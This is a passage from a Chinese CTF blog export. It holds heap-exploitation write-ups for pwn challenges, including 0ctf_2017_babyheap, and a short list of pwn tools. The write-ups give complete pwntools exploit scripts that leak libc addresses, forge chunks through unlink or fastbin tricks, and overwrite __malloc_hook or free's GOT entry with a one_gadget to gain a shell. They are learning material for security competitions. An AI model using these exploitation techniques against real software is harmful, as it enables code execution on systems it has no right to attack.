然后，我们可以通过改变free函数的got表的内容，泄露puts函数的地址，得到libc的基地址，然后改写free函数plt表的内容为one_gadget,从而获取shell。 出现的问题以及解决方案1、程序输入满字节的情况下，会出现先显示OK后接连打出一个FAIL的内容，但是不影响整体的程序进程，在接收puts泄露出的函数地址时，应该recvuntil到”FAIL\\n”的位置，这样才能得到真正的puts的地址。 2、关于unlink机制： 利用条件: 存在UAF unlink源码（向后合并触发）： 1234567/* consolidate backward */if (!prev_inuse(p)) &#123; prevsize = prev_size(p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd);&#125; 当然，对于最开始的unlink机制，是不存在校验的问题，可以通过定义bck，fwd的内容进行任意的修改，现在的unlink机制，加入了校验的内容，源码是： 1234567// fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (&quot;corrupted size vs. prev_size&quot;); \\ 所以这样的话，我们是没有办法直接去做任意的修改，但是我们依旧可以通过控制fd和bk的值，修改特定位置的内容，控制某个指针，来实现后续的操作。 利用方式：（1）申请两个chunk，修改第一个chunk的内容为：0x0，伪造本chunk的大小(一般是本chunk-0x10)，fd（chunklist+0x18-0x18），bk（chunklist+0x18-0x10），pattern_code，pre_size（伪造本chunk的大小-1，去掉pre_inuse值） , 下一个chunk的size-1（即修改pre_inuse值为0）。 （2）free第二个chunk，触发unlink，可以修改在chunklist的位置修改成fd的内容，然后可以利用edit一类的函数，对任意的地址进行修改。 最终exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980##Author by: limu##Terminal: i3##Tools: pwntools##Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *#from pwnlib import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;i3-sensible-terminal&#x27;,&quot;-e&quot;]context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn&quot;) elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3],sys.argv[4]) else: print(&quot;wrong&quot;) sys.exit()##启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p,gdbscript=&#x27;break main&#x27;) pause()def add(size): p.sendline(b&#x27;1&#x27;) p.sendline(str(size).encode()) p.recvuntil(b&#x27;OK&#x27;)def fill(index,content): p.sendline(b&#x27;2&#x27;) p.sendline(str(index).encode()) p.sendline(str(len(content)).encode()) p.sendline(content) p.recvuntil(b&#x27;OK&#x27;) def free(index): p.sendline(b&#x27;3&#x27;) p.sendline(str(index).encode()) def dump(index): p.sendline(b&#x27;4&#x27;) p.sendline(str(index).encode()) p.recvuntil(b&#x27;OK&#x27;)head_addr = 0x00602140add(0x100)add(0x30)add(0x80)add(0x80)payload = p64(0x0)+p64(0x30)+p64(head_addr-0x8)+p64(head_addr)+p64(0x0)+p64(0x0)+p64(0x30)+p64(0x90)fill(2,payload)free(3)p.recvuntil(b&#x27;OK&#x27;)payload2 = p64(0x0) * 2 + p64(elf.got[&#x27;free&#x27;]) + p64(elf.got[&#x27;puts&#x27;])fill(2,payload2)payload3 = p64(elf.plt[&#x27;puts&#x27;])fill(1,payload3)free(2)p.recvuntil(b&#x27;FAIL\\n&#x27;)puts_addr = p.recvuntil(b&#x27;OK\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)puts_addr = u64(puts_addr)base = puts_addr - libc.symbols[&#x27;puts&#x27;]one = base + 0xf0897fill(1,p64(one))free(4)p.interactive()","categories":[],"tags":[{"name":"CTF刷题记录","slug":"CTF刷题记录","permalink":"https://limu.ltd/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"0ctf_2017_babyheap","slug":"0ctf_2017_babyheap","date":"2023-03-14T06:11:03.000Z","updated":"2023-03-14T12:56:14.000Z","comments":true,"path":"2023/03/14/0ctf_2017_babyheap/","link":"","permalink":"https://limu.ltd/2023/03/14/0ctf_2017_babyheap/","excerpt":"","text":"分析题目题目提供了libc 的版本，因为我使用的是archlinux系统，使用的musl的libc，没有适合的ld加载，所以去glibc-all-in-one中下载了合适的glibc并且进行编译,然后使用patchelf更换libc和ld。 丢进Ghidra中，看一下伪代码（没有加载出函数名，找到__libc_start_main找到main函数），发现在Fill选项调用的函数处，存在无限制任意写大小长度的问题，可以考虑溢出堆块。 使用Gdb进行调试的时候，我们发现了程序中存在alarm函数，所以我们打开hex编辑器，找到对应的位置，当然也可以搜索E8EBFEFFFF，更换为NOP（0x90），方便进行gdb的动态调试。 为了方便测试，我们先把调用函数写出来： 1234567891011121314151617def add(size): p.sendlineafter(&quot;Command: &quot;,b&#x27;1&#x27;) p.sendlineafter(&quot;Size: &quot;,str(size).encode())def edit(index,size,content): p.sendlineafter(&quot;Command: &quot;,b&#x27;2&#x27;) p.sendlineafter(&quot;Index: &quot;,str(index).encode()) p.sendlineafter(&quot;Size: &quot;,str(size).encode()) p.sendlineafter(&quot;Content: &quot;,content)def show(index): p.sendlineafter(&quot;Command: &quot;,b&#x27;4&#x27;) p.sendlineafter(&quot;Index: &quot;,str(index).encode())def delete(index): p.sendlineafter(&quot;Command: &quot;,b&#x27;3&#x27;) p.sendlineafter(&quot;Index: &quot;,str(index).encode()) 基本思路首先建立两个fast chunk和一个small chunk，释放第三个chunk，写入第一个chunk溢出到第二个chunk后，修改第二个chunk的大小，使之能够泄露出第三个chunk指向的main_arena的地址(不是main_arena的初始地址，是main_arena+0x58的地址，对应small_bin的位置)，然后根据已知libc中main_arena的相对偏移，获取程序的基址。 然后，通过建立fake_chunk，我们修改__malloc_hook的位置的值为one_gadget地址，然后我们再创建一个chunk，就可以获取shell。 出现的问题及解决方案1、我使用的libc和提供的libc的main_arena的偏移量不同，需要修改。 2、程序使用的alloc，跟malloc存在一部分的区别，malloc创建chunk后不会清空chunk的内容，而alloc会，所以，第三个创建的small_chunk需要重新修复。 3、关于fake_chunk,我们可以理解为在要修改的位置，创建一个包含它的chunk。这里我们可以利用small_bin的双链表，修改fd和bk的值，伪造一个bin，然后我们再malloc一下，在chunk内实现任意写，成功修改目标地址。 最终EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586##Author by: limu##Terminal: i3##Tools: pwntools##Usage: python3 exp.py [local or remote] [yes or no] ip portfrom pwn import *#from pwnlib import *from LibcSearcher import *import syscontext.log_level = &quot;debug&quot;context.terminal = [&#x27;i3-sensible-terminal&#x27;,&quot;-e&quot;]context.arch = &#x27;amd64&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&quot;./libc64.so.6&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)if sys.argv[1] == &#x27;l&#x27;: p = process(&quot;./pwn&quot;) elif sys.argv[1] == &#x27;r&#x27;: p = remote(sys.argv[3],sys.argv[4]) else: print(&quot;wrong&quot;) sys.exit()##启动调试if sys.argv[2] == &#x27;y&#x27;: gdb.attach(p,gdbscript=&#x27;break main&#x27;) pause()def add(size): p.sendlineafter(&quot;Command: &quot;,b&#x27;1&#x27;) p.sendlineafter(&quot;Size: &quot;,str(size).encode())def edit(index,size,content): p.sendlineafter(&quot;Command: &quot;,b&#x27;2&#x27;) p.sendlineafter(&quot;Index: &quot;,str(index).encode()) p.sendlineafter(&quot;Size: &quot;,str(size).encode()) p.sendlineafter(&quot;Content: &quot;,content)def show(index): p.sendlineafter(&quot;Command: &quot;,b&#x27;4&#x27;) p.sendlineafter(&quot;Index: &quot;,str(index).encode())def delete(index): p.sendlineafter(&quot;Command: &quot;,b&#x27;3&#x27;) p.sendlineafter(&quot;Index: &quot;,str(index).encode())add(0x10) #0add(0x10) #1add(0x80) #2add(0x30) #3add(0x68) #4add(0x10) #5 防止合并top_chunkedit(0,0x20,b&#x27;a&#x27;*0x10+p64(0x0)+p64(0x41))edit(2,0x20,p64(0x0)*3+p64(0x71))delete(1)add(0x30) #1edit(1,0x20,p64(0x0)*3+p64(0x91)) ##修复chunkdelete(2)show(1)#pause()one = 0x4525ap.recvuntil(b&quot;\\x91&quot; + b&#x27;\\x00&#x27; * 7)leak_addr = u64(p.recv(6).ljust(8, b&quot;\\x00&quot;))base_addr = leak_addr - (0x3c3b20 + 0x58)print(hex(base_addr))malloc_hook = libc.symbols[&#x27;__malloc_hook&#x27;]one_gadget = base_addr + onefakefd = base_addr + malloc_hook - 0x23print(hex(fakefd))delete(4)edit(3,0x48,p64(0)*7+p64(0x71)+p64(fakefd))add(0x68) #2add(0x68) #4print(hex(one_gadget))edit(4,0x1b,b&#x27;\\x00&#x27;*0x13+p64(one_gadget)) add(0x10)p.interactive()","categories":[],"tags":[{"name":"CTF刷题记录","slug":"CTF刷题记录","permalink":"https://limu.ltd/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}]},{"title":"Pwn环境工具小记","slug":"Pwn环境工具小记","date":"2023-03-13T06:11:03.000Z","updated":"2023-03-14T13:07:50.000Z","comments":true,"path":"2023/03/13/Pwn环境工具小记/","link":"","permalink":"https://limu.ltd/2023/03/13/Pwn%E7%8E%AF%E5%A2%83%E5%B7%A5%E5%85%B7%E5%B0%8F%E8%AE%B0/","excerpt":"","text":"工具集合GhidraGDBgef-pede-pwndbgQemuAFL++IDA脚本集合Glibc-all-in-oneMain_arena_offsetPatchelfOne_gadgetRopgadgetSeccomp-toolsPython库集合PwntoolsLibcsearcher本地Libcsearcher在线Angr","categories":[],"tags":[{"name":"杂记","slug":"杂记","permalink":"https://limu.ltd/tags/%E6%9D%82%E8%AE%B0/"}]}],"categories":[],"tags":[{"name":"CTF刷题记录","slug":"CTF刷题记录","permalink":"https://limu.ltd/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"name":"IoT","slug":"IoT","permalink":"https://limu.ltd/tags/IoT/"},{"name":"杂记","slug":"杂记","permalink":"https://limu.ltd/tags/%E6%9D%82%E8%AE%B0/"}]}